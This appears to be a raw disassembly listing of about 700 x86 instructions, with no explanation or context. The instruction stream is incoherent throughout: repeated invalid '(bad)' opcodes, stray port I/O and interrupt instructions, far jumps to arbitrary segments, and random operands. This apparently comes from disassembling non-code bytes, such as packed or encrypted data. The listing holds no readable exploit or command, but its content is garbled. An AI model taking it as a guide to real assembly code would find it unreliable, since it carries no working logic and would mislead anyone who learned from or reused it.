  41d26d:	xor    ebp,DWORD PTR [edi+0x29]
  41d270:	mov    DWORD PTR [ecx+0x75fb2f73],0x2e22dd42
  41d27a:	bound  edi,QWORD PTR ds:0xa5508cf8
  41d280:	push   ss
  41d281:	int    0x64
  41d283:	xchg   esp,eax
  41d284:	(bad)  
  41d285:	sbb    DWORD PTR [ebx+ecx*2+0x6d3dba2c],edi
  41d28c:	fcom   st(3)
  41d28e:	mov    ss,WORD PTR [eax]
  41d290:	and    esi,DWORD PTR [ebx+0x7d469e66]
  41d296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d297:	adc    DWORD PTR [eax],edi
  41d299:	mov    DWORD PTR ds:0x1b1740d8,edx
  41d29f:	fisubr DWORD PTR [ecx+ecx*1]
  41d2a2:	out    0x6c,al
  41d2a4:	push   0x7e
  41d2a6:	xor    DWORD PTR [esi+0x54b2c087],esp
  41d2ac:	xchg   esi,eax
  41d2ad:	push   es
  41d2ae:	add    BYTE PTR [esi+0x2405bb44],0x46
  41d2b5:	lods   al,BYTE PTR ds:[esi]
  41d2b6:	xor    DWORD PTR [eax],edi
  41d2b8:	arpl   WORD PTR [ecx+0x6f],bx
  41d2bb:	cmp    al,0x88
  41d2bd:	addr16 loopne 0x41d255
  41d2c0:	sbb    eax,edi
  41d2c2:	xchg   ecx,eax
  41d2c3:	inc    esi
  41d2c4:	aas    
  41d2c5:	lds    eax,FWORD PTR [edi+ebp*1+0x12]
  41d2c9:	std    
  41d2ca:	ss popa 
  41d2cc:	cmc    
  41d2cd:	or     DWORD PTR [esi-0x5a3980f4],ebx
  41d2d3:	jo     0x41d263
  41d2d5:	mov    dl,0x2a
  41d2d7:	mov    ecx,0xe724f93c
  41d2dc:	scas   al,BYTE PTR es:[edi]
  41d2dd:	out    dx,al
  41d2de:	jo     0x41d349
  41d2e0:	jae    0x41d326
  41d2e2:	xor    edi,DWORD PTR [edi+0x9]
  41d2e5:	mov    ch,0x1c
  41d2e7:	rcr    DWORD PTR [eax-0x6d],0xd
  41d2eb:	and    al,dl
  41d2ed:	xchg   BYTE PTR [eax+0x13],cl
  41d2f0:	ss cwde 
  41d2f2:	jmp    0x1556:0x8771e615
  41d2f9:	shl    DWORD PTR [ecx],1
  41d2fb:	and    al,BYTE PTR [ebx]
  41d2fd:	add    al,0x83
  41d2ff:	stos   BYTE PTR es:[edi],al
  41d300:	shr    dl,cl
  41d302:	push   ebp
  41d303:	pop    edx
  41d304:	fld    QWORD PTR [edx-0x58]
  41d307:	jo     0x41d33b
  41d309:	les    ecx,FWORD PTR [edx-0x67]
  41d30c:	shr    esi,1
  41d30e:	adc    BYTE PTR ds:0x5efadce1,0x1a
  41d315:	push   eax
  41d316:	rol    BYTE PTR ds:0x2ed8885c,cl
  41d31c:	xchg   ebp,eax
  41d31d:	inc    ebp
  41d31e:	xsha1  (bad)
  41d31f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d320:	iret   
  41d321:	std    
  41d322:	jmp    0xd08c:0x1a1a9029
  41d329:	fimul  DWORD PTR [edx+0x61625ace]
  41d32f:	jmp    0xb70bda58
  41d334:	mov    edi,0xba92d36c
  41d339:	sub    BYTE PTR [ebx-0x48de5ff],ah
  41d33f:	mov    cl,0x92
  41d341:	cmc    
  41d342:	pop    es
  41d343:	js     0x41d313
  41d345:	clc    
  41d346:	outs   dx,BYTE PTR ds:[esi]
  41d347:	xor    eax,0x8205ebd
  41d34c:	xor    DWORD PTR [edi+0x7a3e4b2a],esi
  41d352:	ss in  al,0x1c
  41d355:	fiadd  DWORD PTR [edi-0x6f]
  41d358:	inc    ebp
  41d359:	or     DWORD PTR [esi],0x0
  41d35c:	cmp    DWORD PTR [edx+0x48],edi
  41d35f:	jge    0x41d362
  41d361:	sti    
  41d362:	xlat   BYTE PTR ds:[ebx]
  41d363:	mov    ah,ah
  41d365:	mov    DWORD PTR [esi+ecx*1-0x42],0xbf8d0596
  41d36d:	mov    edi,0xf7d59fbb
  41d372:	shl    BYTE PTR [edx+0xf],0x16
  41d376:	neg    BYTE PTR [edi-0x3523f01]
  41d37c:	stc    
  41d37d:	inc    edi
  41d37e:	(bad)  
  41d380:	stc    
  41d381:	mov    bl,0xfc
  41d383:	(bad)  
  41d384:	mov    bh,0x19
  41d386:	dec    esi
  41d387:	jb     0x41d38c
  41d389:	mov    ch,0xbd
  41d38b:	xchg   ecx,eax
  41d38c:	mov    ecx,0x94e34c36
  41d391:	es movq mm1,mm5
  41d395:	dec    ebx
  41d396:	nop
  41d397:	jnp    0x41d40a
  41d399:	(bad)  
  41d39a:	push   ds
  41d39b:	xor    esi,DWORD PTR [esi]
  41d39d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d39e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d39f:	cdq    
  41d3a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3a1:	add    DWORD PTR [esi-0x134a6028],0xffffffdf
  41d3a8:	es in  al,0x72
  41d3ab:	fild   QWORD PTR [ecx]
  41d3ad:	add    al,0x21
  41d3af:	je     0x41d33b
  41d3b1:	push   es
  41d3b2:	push   ss
  41d3b3:	mov    bh,0x22
  41d3b5:	xor    BYTE PTR [ebx+0x16],0x53
  41d3b9:	mov    eax,0xa15a0804
  41d3be:	popf   
  41d3bf:	ins    DWORD PTR es:[edi],dx
  41d3c0:	mov    edi,0xf13f5dfa
  41d3c5:	pop    ebx
  41d3c6:	pop    edi
  41d3c7:	mul    esi
  41d3c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3ca:	out    0x5f,al
  41d3cc:	jb     0x41d40a
  41d3ce:	loopne 0x41d3db
  41d3d0:	mov    es,WORD PTR [eax]
  41d3d2:	push   cs
  41d3d3:	xchg   esi,eax
  41d3d4:	(bad)  
  41d3d5:	(bad)  
  41d3d6:	imul   ebp,DWORD PTR [ecx-0x40],0xffffffb5
  41d3da:	jmp    0x1fd5c046
  41d3df:	cmp    edi,edi
  41d3e1:	jecxz  0x41d3b9
  41d3e3:	push   edi
  41d3e4:	daa    
  41d3e5:	mov    bh,BYTE PTR [edx+0x356b4b30]
  41d3eb:	dec    ebp
  41d3ec:	sbb    ebp,eax
  41d3ee:	mov    edx,0x3ea77b29
  41d3f3:	dec    ebp
  41d3f4:	aam    0x19
  41d3f6:	ror    edi,1
  41d3f8:	sub    BYTE PTR [edx+0x629a5ed4],cl
  41d3fe:	dec    ebx
  41d3ff:	dec    ecx
  41d400:	jmp    0x314a:0x448c1635
  41d407:	inc    esp
  41d408:	xchg   esp,eax
  41d409:	inc    esi
  41d40a:	(bad)  [eax+eiz*2-0x12ccd215]
  41d411:	nop
  41d412:	scas   al,BYTE PTR es:[edi]
  41d413:	inc    ebp
  41d414:	mov    ebp,es
  41d416:	or     cl,ah
  41d418:	inc    ebx
  41d419:	loop   0x41d3bf
  41d41b:	inc    edi
  41d41c:	in     eax,dx
  41d41d:	push   edx
  41d41e:	pop    ebx
  41d41f:	sub    cl,BYTE PTR [edx+0x682081a8]
  41d425:	adc    al,0xa2
  41d427:	movaps xmm0,XMMWORD PTR [edx-0x2c]
  41d42b:	adc    al,0x4a
  41d42d:	iret   
  41d42e:	and    eax,0x44d2a9d2
  41d433:	and    DWORD PTR [esi-0x3f],eax
  41d436:	imul   ecx,DWORD PTR [edx+0x39],0xffffffb6
  41d43a:	cmp    eax,DWORD PTR [edi-0x64]
  41d43d:	jp     0x41d449
  41d43f:	sbb    ebx,DWORD PTR [ecx]
  41d441:	pop    ss
  41d442:	xor    DWORD PTR [ecx+0x3ed93cf3],0x67586ecb
  41d44c:	dec    ecx
  41d44d:	inc    edi
  41d44e:	adc    al,0xed
  41d450:	sbb    BYTE PTR [ebx+0x3d],ah
  41d453:	inc    edi
  41d454:	mov    dl,0xd1
  41d457:	fidiv  DWORD PTR [eax+0x25]
  41d45a:	outs   dx,BYTE PTR ds:[esi]
  41d45b:	push   eax
  41d45c:	mov    eax,0xa06a313b
  41d461:	or     ebx,DWORD PTR [eax+0x17]
  41d464:	jo     0x41d4dc
  41d466:	and    eax,DWORD PTR [ecx]
  41d468:	add    BYTE PTR [edx],0x33
  41d46b:	popf   
  41d46c:	adc    esi,DWORD PTR [ebp-0x72]
  41d46f:	xor    DWORD PTR [ecx+0x16],ebp
  41d472:	mov    al,ds:0xad218f13
  41d477:	cs xchg ecx,eax
  41d479:	dec    eax
  41d47a:	aam    0x2d
  41d47c:	sub    al,0x15
  41d47e:	and    ch,BYTE PTR [edi]
  41d480:	mov    eax,ds:0x43282b30
  41d485:	ss jecxz 0x41d490
  41d488:	inc    edi
  41d489:	int    0xe6
  41d48b:	pop    esp
  41d48c:	mov    eax,0x76ae16ab
  41d491:	add    ecx,ebx
  41d493:	popf   
  41d494:	push   sp
  41d496:	pop    esp
  41d497:	jns    0x41d503
  41d499:	adc    bh,BYTE PTR [eax]
  41d49b:	jge    0x41d519
  41d49d:	sub    DWORD PTR [ebx+0x77],ecx
  41d4a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4a1:	lods   eax,DWORD PTR ds:[esi]
  41d4a2:	dec    edi
  41d4a3:	or     DWORD PTR [edx+0x36],eax
  41d4a6:	dec    edi
  41d4a7:	jecxz  0x41d43c
  41d4a9:	clc    
  41d4aa:	cdq    
  41d4ab:	add    DWORD PTR [ebp+0x1b],0xffffffad
  41d4af:	int    0x61
  41d4b1:	mov    ah,0x51
  41d4b3:	xor    BYTE PTR [ecx],dh
  41d4b5:	(bad)  
  41d4b6:	in     al,0xee
  41d4b8:	fild   DWORD PTR [ecx+0x7991ef7b]
  41d4be:	mul    BYTE PTR [edx]
  41d4c0:	imul   esi,DWORD PTR [esi-0x80],0x728b12e9
  41d4c7:	mov    cl,0xec
  41d4c9:	out    0xe7,al
  41d4cb:	arpl   si,ax
  41d4cd:	add    BYTE PTR [edx+0x44],dl
  41d4d0:	mov    dl,0x8f
  41d4d2:	mov    eax,0x6ab4c4ab
  41d4d7:	ja     0x41d4c2
  41d4d9:	jle    0x41d517
  41d4db:	sbb    BYTE PTR [ecx],bl
  41d4dd:	inc    eax
  41d4de:	cs or  eax,0xd54fd166
  41d4e4:	fcom   QWORD PTR [esi]
  41d4e6:	sbb    al,0xf
  41d4e8:	cmp    BYTE PTR [edx],ah
  41d4ea:	and    eax,0x107914c6
  41d4ef:	push   edx
  41d4f0:	dec    edx
  41d4f1:	ror    BYTE PTR [edi+0x52078f15],cl
  41d4f7:	xchg   ebp,eax
  41d4f8:	mov    esi,0x3a0f50e1
  41d4fd:	(bad)  
  41d4fe:	(bad)  
  41d4ff:	jmp    0x16821a42
  41d504:	out    0x9b,eax
  41d506:	push   ds
  41d507:	dec    edx
  41d508:	das    
  41d509:	pop    esi
  41d50a:	ds mov ah,0xc4
  41d50d:	cli    
  41d50e:	inc    edi
  41d50f:	mov    bh,0x79
  41d511:	ja     0x41d4c8
  41d513:	retf   0x7c77
  41d516:	test   ebx,0x49f4e0f9
  41d51c:	or     dh,BYTE PTR [edi]
  41d51e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d51f:	mov    dh,0x73
  41d521:	sub    dh,BYTE PTR [ebx]
  41d523:	mov    al,ds:0x1d2992a7
  41d528:	inc    ecx
  41d529:	and    bl,BYTE PTR [ebp-0x10a0f1fa]
  41d52f:	fnstcw WORD PTR [edx+0x3a]
  41d532:	xor    bl,BYTE PTR [edx-0x56]
  41d535:	(bad)  
  41d537:	call   0xc963:0xd16a30e7
  41d53e:	repnz pop edx
  41d540:	lea    ebp,[edi]
  41d542:	and    al,0x45
  41d544:	add    BYTE PTR [ecx+0x1b0b0b55],bh
  41d54a:	jmp    0x41d527
  41d54c:	test   al,0x49
  41d54e:	mov    WORD PTR [ebx],gs
  41d550:	jno    0x41d568
  41d552:	rol    DWORD PTR ds:0x2e98778c,cl
  41d558:	shl    BYTE PTR [ebp-0x50906673],1
  41d55e:	jmp    FWORD PTR [ebx]
  41d560:	loopne 0x41d518
  41d562:	iret   
  41d563:	int    0xfa
  41d565:	mov    esi,0x8a0bedf0
  41d56a:	add    BYTE PTR [esi],bh
  41d56c:	fcmovne st,st(2)
  41d56e:	movaps xmm7,xmm6
  41d571:	jg     0x41d577
  41d573:	in     al,0x81
  41d575:	jg     0x41d572
  41d577:	sahf   
  41d578:	fwait
  41d579:	add    eax,0xb7ac77f7
  41d57e:	xchg   ebp,eax
  41d57f:	sub    ebx,DWORD PTR [ebx*2-0x494326e5]
  41d586:	dec    ebx
  41d587:	sbb    al,0x4f
  41d589:	mov    eax,0x89fba2f6
  41d58e:	mov    esi,0x94e67c41
  41d593:	pop    es
  41d594:	int    0x84
  41d596:	xchg   ebx,eax
  41d597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d598:	mul    BYTE PTR [ebx]
  41d59a:	mov    ss,WORD PTR [esi+edi*4]
  41d59d:	mov    dh,0x91
  41d59f:	fnstcw WORD PTR [ecx+eiz*2+0x6890ef3a]
  41d5a6:	ror    DWORD PTR [edi],cl
  41d5a8:	cmp    eax,0x4a01f16f
  41d5ad:	ins    BYTE PTR es:[edi],dx
  41d5ae:	add    dh,BYTE PTR [edx+eax*2+0x557e5497]
  41d5b5:	sar    DWORD PTR [edi+eax*8+0x7c],cl
  41d5b9:	inc    ecx
  41d5ba:	test   DWORD PTR [esi-0x6d],ecx
  41d5bd:	shr    BYTE PTR [eax+ebp*1-0x5db3570d],cl
  41d5c4:	rol    dh,1
  41d5c6:	adc    al,0xfa
  41d5c8:	into   
  41d5c9:	and    dh,BYTE PTR [ebx+esi*8]
  41d5cc:	aam    0x14
  41d5ce:	mov    WORD PTR fs:[eax],fs
  41d5d1:	push   0xffffffd9
  41d5d3:	cdq    
  41d5d4:	xchg   esp,eax
  41d5d5:	js     0x41d5f4
  41d5d7:	push   eax
  41d5d8:	jns    0x41d59f
  41d5da:	adc    eax,0x951c6542
  41d5df:	sub    edi,DWORD PTR [ecx]
  41d5e1:	pop    esp
  41d5e2:	push   cs
  41d5e3:	mov    eax,0x14535871
  41d5e8:	xchg   BYTE PTR [ebx],ah
  41d5ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5eb:	jo     0x41d658
  41d5ed:	sbb    ecx,esi
  41d5ef:	adc    bl,BYTE PTR [eax+0x72]
  41d5f2:	aaa    
  41d5f3:	rol    ch,cl
  41d5f5:	sub    DWORD PTR [edx],edx
  41d5f7:	mov    dh,0x18
  41d5f9:	xchg   esp,eax
  41d5fa:	sub    eax,0x4d1298b6
  41d5ff:	inc    eax
  41d600:	jge    0x41d645
  41d602:	jecxz  0x41d5aa
  41d604:	inc    esp
  41d605:	mov    bl,0x87
  41d607:	xor    eax,0x5bfbe66d
  41d60c:	or     al,0xd3
  41d60e:	mov    WORD PTR [edx+0x2b],gs
  41d611:	push   esi
  41d612:	or     ch,BYTE PTR [edx]
  41d614:	jae    0x41d5a8
  41d616:	mov    cl,0x3d
  41d618:	lea    esi,[ecx]
  41d61a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d61b:	cwde   
  41d61c:	les    esp,FWORD PTR [ebp-0x52]
  41d61f:	dec    esp
  41d620:	pop    es
  41d621:	ins    BYTE PTR es:[edi],dx
  41d622:	test   BYTE PTR [edx-0x79b890f1],bl
  41d628:	into   
  41d629:	arpl   WORD PTR [edx+esi*2+0x5dc752cf],cx
  41d630:	mov    ds:0x94f199c0,eax
  41d635:	pop    ebx
  41d636:	xchg   BYTE PTR [ebx+0x9],bh
  41d639:	(bad)
  41d63c:	call   0x928b563c
  41d641:	retf   
  41d642:	hlt    
  41d643:	imul   edx,ebx,0xffffff81
  41d646:	mov    esp,0x7b155fb9
  41d64b:	push   cs
  41d64c:	mov    es,WORD PTR [edx]
  41d64e:	pop    ebp
  41d64f:	ss stos BYTE PTR es:[edi],al
  41d651:	xor    DWORD PTR ss:[ebx-0x68],0xffffffdc
  41d656:	xchg   DWORD PTR [edi+0x2fe8993],ebx
  41d65c:	mov    DWORD PTR [esi],esi
  41d65e:	in     eax,dx
  41d65f:	outs   dx,DWORD PTR ds:[esi]
  41d660:	shr    ebx,0xef
  41d663:	ja     0x41d5fb
  41d665:	push   edi
  41d666:	sti    
  41d667:	push   0xbcfd03e8
  41d66c:	add    dh,ah
  41d66e:	push   eax
  41d66f:	sbb    DWORD PTR [ebx+eiz*8-0x36f2fc11],0xf9b3d3c1
  41d67a:	cli    
  41d67b:	xor    ecx,DWORD PTR [ecx+0x5a]
  41d67e:	(bad)  
  41d67f:	mov    edx,0x65cb0990
  41d684:	rcr    eax,1
  41d686:	inc    edi
  41d687:	sub    BYTE PTR [edx-0x6e0cfa00],dh
  41d68d:	xor    esp,edx
  41d68f:	scas   eax,DWORD PTR es:[edi]
  41d690:	stc    
  41d691:	(bad)  
  41d692:	ds xor al,dl
  41d695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d696:	pop    ds
  41d697:	mov    ebp,0x48f3faa3
  41d69c:	xchg   DWORD PTR [eax],ebx
  41d69e:	cwde   
  41d69f:	out    dx,al
  41d6a0:	jne    0x41d62e
  41d6a2:	push   esi
  41d6a3:	inc    edi
  41d6a4:	mov    WORD PTR [edi+0x47],ss
  41d6a7:	pop    esp
  41d6a8:	js     0x41d6e9
  41d6aa:	in     al,dx
  41d6ab:	test   DWORD PTR [esi],eax
  41d6ad:	stos   DWORD PTR es:[edi],eax
  41d6ae:	retf   
  41d6af:	in     al,dx
  41d6b0:	test   DWORD PTR [esi-0x2599acd7],edx
  41d6b6:	xor    dl,BYTE PTR [ebx-0x7718b340]
  41d6bc:	inc    esi
  41d6bd:	push   0x31
  41d6bf:	sbb    al,0xae
  41d6c1:	sub    edx,DWORD PTR [esi+0x6cec168f]
  41d6c7:	dec    ebp
  41d6c8:	inc    eax
  41d6c9:	test   BYTE PTR [ebp+0xa520323],dh
  41d6cf:	xchg   edi,eax
  41d6d0:	rol    BYTE PTR [ecx+0x354d52f1],cl
  41d6d6:	sub    cl,bl
  41d6d8:	fstp   DWORD PTR [edx+esi*2+0x5736f2ed]
  41d6df:	das    
  41d6e0:	ins    DWORD PTR es:[edi],dx
  41d6e1:	jno    0x41d6d8
  41d6e3:	rcl    BYTE PTR [esi],cl
  41d6e5:	bound  edx,QWORD PTR [ebx+eax*8+0x218997c7]
  41d6ec:	div    DWORD PTR [edx]
  41d6ee:	sbb    BYTE PTR [ebx+0x59],cl
  41d6f1:	xchg   esi,eax
  41d6f2:	clc    
  41d6f3:	stos   BYTE PTR es:[edi],al
  41d6f4:	rcl    BYTE PTR [ebp+0x1e],0x5f
  41d6f8:	js     0x41d73c
  41d6fa:	pushf  
  41d6fb:	fdiv   st(4),st
  41d6fd:	into   
  41d6fe:	pop    ds
  41d6ff:	mov    ebp,0xd4bebbef
  41d704:	push   ecx
  41d705:	rcl    BYTE PTR [edi],0xe4
  41d708:	add    BYTE PTR [edx-0xe],bh
  41d70b:	dec    edi
  41d70c:	lar    edi,si
  41d70f:	gs inc esp
  41d711:	mov    al,ds:0x30fa2033
  41d716:	out    0xca,al
  41d718:	xor    edx,edi
  41d71a:	jle    0x41d766
  41d71c:	lods   al,BYTE PTR ds:[esi]
  41d71d:	lods   al,BYTE PTR ds:[esi]
  41d71e:	clc    
  41d71f:	retf   0x7261
  41d722:	fldcw  WORD PTR [edi-0x48]
  41d725:	adc    al,0x58
  41d727:	jg     0x41d6ee
  41d729:	out    dx,eax
  41d72a:	mov    eax,ds:0x83718332
  41d72f:	sub    al,0x45
  41d731:	mov    ah,0x52
  41d733:	bound  ecx,QWORD PTR [esp+esi*2]
  41d736:	dec    ebp
  41d737:	fwait
  41d738:	(bad)  
  41d739:	xor    eax,0xbdcb8b39
  41d73e:	stos   DWORD PTR es:[edi],eax
  41d73f:	rol    DWORD PTR [edx+0x43],0xa2
  41d743:	test   DWORD PTR [edx],ecx
  41d745:	sub    edi,esi
  41d747:	and    al,0x2a
  41d749:	fisub  WORD PTR [edx+edi*2-0x15d15752]
  41d750:	in     eax,0x22
  41d752:	adc    BYTE PTR [ebx-0x7d],0x15
  41d756:	inc    ebx
  41d757:	in     al,dx
  41d758:	inc    edx
  41d759:	add    al,ch
  41d75b:	dec    esp
  41d75c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d75d:	inc    ecx
  41d75e:	(bad)  
  41d760:	and    al,0xfa
  41d762:	rol    BYTE PTR [esp+eiz*2-0x27b14c0c],1
  41d769:	or     al,0x91
  41d76b:	dec    ecx
  41d76c:	pop    es
  41d76d:	dec    ebp
  41d76e:	push   eax
  41d76f:	ss pop edx
  41d771:	sub    DWORD PTR [ecx+0x2b],0xffffffa2
  41d775:	cdq    
  41d776:	jecxz  0x41d705
  41d778:	jo     0x41d756
  41d77a:	jnp    0x41d786
  41d77c:	imul   edi,DWORD PTR [ecx],0x6c
  41d77f:	cmp    eax,0x6a8359d7
  41d784:	in     al,0x44
  41d786:	test   eax,0x3076ae9c
  41d78b:	adc    bl,al
  41d78d:	in     eax,dx
  41d78e:	xor    esp,DWORD PTR cs:[ecx+0x4c]
  41d792:	push   ecx
  41d793:	inc    ebp
  41d794:	int3   
  41d795:	jo     0x41d75d
  41d797:	les    ebp,FWORD PTR [edx+esi*4+0x35]
  41d79b:	fbld   TBYTE PTR [edx+0x16]
  41d79e:	ss push ecx
  41d7a0:	fld    DWORD PTR [esi-0x1b]
  41d7a3:	adc    ch,BYTE PTR [edx]
  41d7a5:	cmp    ecx,DWORD PTR [ecx+0x318340df]
  41d7ab:	xor    eax,0xcce1acd6
  41d7b0:	sbb    cl,BYTE PTR [esi+0x6]
  41d7b3:	or     al,0xcc
  41d7b5:	or     dl,BYTE PTR [ecx+0xe]
  41d7b8:	jno    0x41d75f
  41d7ba:	pop    ecx
  41d7bb:	out    0xc2,al
  41d7bd:	ins    BYTE PTR es:[edi],dx
  41d7be:	dec    esp
  41d7bf:	arpl   WORD PTR [esi+0x70],dx
  41d7c2:	adc    DWORD PTR ds:0xee469c9e,0x5e
  41d7c9:	stos   BYTE PTR es:[edi],al
  41d7ca:	mov    eax,0xa6a198be
  41d7cf:	rcr    DWORD PTR [edx+0x43],0x27
  41d7d3:	sbb    eax,0xc4f1d093
  41d7d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7d9:	pop    edx
  41d7da:	aam    0xec
  41d7dc:	sete   ch
  41d7df:	imul   DWORD PTR ds:0x9aa6fb5d
  41d7e5:	adc    al,0xca
  41d7e7:	fwait
  41d7e8:	ins    BYTE PTR es:[edi],dx
  41d7e9:	or     edx,DWORD PTR [edx]
  41d7eb:	xor    edx,DWORD PTR [ebx-0x2bbc6cb2]
  41d7f1:	cld    
  41d7f2:	iret   
  41d7f3:	hlt    
  41d7f4:	xchg   edi,eax
  41d7f5:	pop    ebp
  41d7f6:	in     al,dx
  41d7f7:	fwait
  41d7f8:	sub    dl,BYTE PTR [ebx+0x7ea4fe2]
  41d7fe:	dec    eax
  41d7ff:	adc    DWORD PTR [edx+0x5e],eax
  41d802:	iret   
  41d803:	push   edx
  41d804:	mov    ah,0x40
  41d806:	jg     0x41d7c8
  41d808:	ins    BYTE PTR es:[edi],dx
  41d809:	hlt    
  41d80a:	and    DWORD PTR [ebx],eax
  41d80c:	test   BYTE PTR [eax+0x6e7fe14],bl
  41d812:	mov    eax,ds:0x67ef643e
  41d817:	shld   DWORD PTR [ebx-0x14],eax,0x3b
  41d81c:	pop    es
  41d81d:	xchg   esp,eax
  41d81e:	fsub   QWORD PTR [edx]
  41d820:	cld    
  41d821:	out    0xaf,eax
  41d823:	sbb    al,0xcd
  41d825:	sbb    eax,eax
  41d827:	ret    0xb06b
  41d82a:	cmp    BYTE PTR [esp+eiz*2],ah
  41d82d:	rol    BYTE PTR ds:[ecx-0x46ee8070],0x70
  41d835:	shr    al,0xd3
  41d838:	or     edi,esi
  41d83a:	jle    0x41d87c
  41d83c:	inc    ebp
  41d83d:	pop    ss
  41d83e:	ins    BYTE PTR es:[edi],dx
  41d83f:	ret    0xb4e9
  41d842:	arpl   WORD PTR [esi],si
  41d844:	in     eax,dx
  41d845:	push   edx
  41d846:	fstp   QWORD PTR [edi-0x20]
  41d849:	mov    cl,0x47
  41d84b:	xchg   esi,eax
  41d84c:	pop    eax
  41d84d:	xchg   edx,eax
  41d84e:	jecxz  0x41d8bc
  41d850:	push   es
  41d851:	fmul   DWORD PTR [esi]
  41d853:	adc    edx,esi
  41d855:	jecxz  0x41d87d
  41d857:	iret   
  41d858:	mov    ah,0x17
  41d85a:	mov    ecx,0x62d3aed2
  41d85f:	pop    eax
  41d860:	setg   ah
  41d863:	xchg   ebp,eax
  41d864:	imul   esp,DWORD PTR [edi+0x48efbef8],0xffffffe0
  41d86b:	ret    
  41d86c:	mov    ch,0x4b
  41d86e:	fwait
  41d86f:	and    BYTE PTR [esi],ah
  41d871:	leave  
  41d872:	into   
  41d873:	stos   DWORD PTR es:[edi],eax
  41d874:	xor    BYTE PTR [edx-0x56],bl
  41d877:	sbb    DWORD PTR [edx*2-0x66b09214],ebp
  41d87e:	dec    esi
  41d87f:	data16 fdivr st(5),st
  41d882:	int    0x43
  41d884:	jle    0x41d87e
  41d886:	pop    ss
  41d887:	outs   dx,BYTE PTR ds:[esi]
  41d888:	and    eax,0xe9e972a8
  41d88d:	push   esp
  41d88e:	adc    al,BYTE PTR [ecx+ecx*2-0x36]
  41d892:	dec    eax
  41d893:	inc    eax
  41d894:	xor    DWORD PTR [eax-0x54],esi
  41d897:	sbb    eax,0x89f0e55f
  41d89c:	adc    eax,0xe35f1f0e
  41d8a1:	shl    cl,1
  41d8a3:	mov    cl,0x94
  41d8a5:	mov    esi,0x83d392fd
  41d8aa:	mov    edi,0x3f702a60
  41d8af:	push   es
  41d8b0:	in     al,dx
  41d8b1:	das    
  41d8b2:	fwait
  41d8b3:	add    bh,BYTE PTR [edi+ebp*1-0x38]
  41d8b7:	push   ebp
  41d8b8:	xor    BYTE PTR [edi+0x78bf83fb],bh
  41d8be:	jnp    0x41d8f3
  41d8c0:	or     DWORD PTR [edi+0x71],ebp
  41d8c3:	cmp    DWORD PTR gs:[eax-0x5a7ceab9],ebp
  41d8ca:	xchg   edx,eax
  41d8cb:	data16 (bad) 
  41d8cd:	adc    DWORD PTR [esi-0x5494749],edx
  41d8d3:	adc    DWORD PTR [edx+0x1d4383dd],esp
  41d8d9:	outs   dx,BYTE PTR ds:[esi]
  41d8da:	xchg   esp,eax
  41d8db:	mov    DWORD PTR [eax],ebp
  41d8dd:	adc    DWORD PTR [esi+edx*1],ecx
  41d8e0:	push   edi
  41d8e1:	cmp    BYTE PTR [edx-0x7e921d36],cl
  41d8e7:	cmc    
  41d8e8:	xchg   esi,eax
  41d8e9:	pusha  
  41d8ea:	test   BYTE PTR [esi+0x23],cl
  41d8ed:	into   
  41d8ee:	dec    edx
  41d8ef:	push   0xfffffffa
  41d8f1:	or     DWORD PTR [ecx],eax
  41d8f3:	das    
  41d8f4:	inc    edx
  41d8f5:	ins    DWORD PTR es:[edi],dx
  41d8f6:	cmp    eax,0xf08524e
  41d8fb:	and    DWORD PTR [edi-0x3b5f9676],eax
  41d901:	sub    al,0xa4
  41d903:	jno    0x41d963
  41d905:	std    
  41d906:	adc    al,0xda
  41d908:	dec    esi
  41d909:	repz inc ebp
  41d90b:	adc    eax,0x51163105
  41d910:	cwde   
  41d911:	sub    BYTE PTR [edi+eiz*2-0x57],cl
  41d915:	cmc    
  41d916:	push   edi
  41d917:	lock test al,0xe
  41d91a:	and    DWORD PTR [eax-0x16],edi
  41d91d:	xor    dh,BYTE PTR [eax+0x64]
  41d920:	sbb    al,0x58
  41d922:	cmc    
  41d923:	sahf   
  41d924:	or     DWORD PTR [ecx+0x46],0xcc09a973
  41d92b:	and    BYTE PTR [ebx-0x2b],0x58
  41d92f:	adc    dh,0xec
  41d932:	je     0x41d969
  41d934:	push   edi
  41d935:	fstp   TBYTE PTR ds:0x7675ba76
  41d93b:	in     al,0x12
  41d93d:	sub    ch,bl
  41d93f:	int3   
  41d940:	loop   0x41d950
  41d942:	into   
  41d943:	jne    0x41d999
  41d945:	dec    esi
  41d946:	adc    BYTE PTR [ebx],dh
  41d948:	mov    ds:0xe3cc5b8b,eax
  41d94d:	push   ebp
  41d94e:	and    dl,BYTE PTR [ebx]
  41d950:	inc    esp
  41d951:	sbb    al,0x8e
  41d953:	ret    
  41d954:	js     0x41d98f
  41d956:	inc    esp
  41d957:	popa   
  41d958:	xchg   esi,eax
  41d959:	cwde   
  41d95a:	lds    eax,FWORD PTR [ebx-0x64]
  41d95d:	fwait
  41d95e:	cmp    DWORD PTR [esi+0xdc61c68],ebx
  41d964:	sbb    BYTE PTR ds:0xb25f1806,cl
  41d96a:	shr    DWORD PTR [eax],1
  41d96c:	aaa    
  41d96d:	adc    eax,0x877ee396
  41d972:	rcl    BYTE PTR [esi+eax*2+0x5c8d5d95],0x6e
  41d97a:	cmp    al,0xf
  41d97c:	ins    BYTE PTR es:[edi],dx
  41d97d:	jnp    0x41d9b5
  41d97f:	pop    edx
  41d980:	loope  0x41d946
  41d982:	jb     0x41d911
  41d984:	repz es dec ecx
  41d987:	bound  eax,QWORD PTR [ecx]
  41d989:	iret   
  41d98a:	pop    ebp
  41d98b:	pop    es
  41d98c:	sti    
  41d98d:	mov    ah,0x20
  41d98f:	cmp    eax,0xe2805496
  41d994:	ret    0x43f
  41d997:	test   DWORD PTR [esi+0x7a43eff],esi
  41d99d:	clc    
  41d99e:	rcl    dh,cl
  41d9a0:	add    DWORD PTR [ecx-0x17d2c66],0x4d
